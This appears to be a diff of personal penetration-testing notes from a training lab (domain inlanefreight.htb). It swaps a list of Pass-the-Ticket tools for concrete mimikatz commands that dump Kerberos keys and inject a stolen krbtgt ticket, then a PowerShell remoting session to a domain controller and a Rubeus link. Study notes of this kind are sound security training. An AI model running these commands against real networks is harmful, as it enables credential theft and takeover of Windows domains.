@@ -202,13 +202,16 @@ NetExec (nxc):
 
 
 Pass the Tickets (PtT):
-  mimikatz
-  Invoke-SMBExec  /  Invoke-WMIExec 
-  impacket-psexec  / wmiexec  /  atexec  / wmiexec
-  netexec smb
-  evil-winrm
-  reg by nxc + RDP
+  mimikatz.exe
+  privilege::debug
+  sekurlsa::ekeys
+  kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
 
+  Enter-PSSession -ComputerName DC01
+
+  https://github.com/GhostPack/Rubeus
+
+  
 
 
 
